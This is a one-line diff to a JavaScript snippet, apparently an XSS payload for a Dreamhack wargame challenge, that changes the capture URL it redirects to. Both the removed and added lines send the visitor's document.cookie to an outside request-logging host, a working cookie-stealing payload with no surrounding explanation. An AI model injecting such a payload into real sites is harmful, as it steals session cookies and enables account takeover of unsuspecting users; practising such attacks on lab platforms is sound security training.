@@ -1,1 +1,1 @@
-location.href = "https://nsci5bsr.request.dreamhack.games/" + document.cookie
+location.href = "https://cismelz.request.dreamhack.games/" + document.cookie
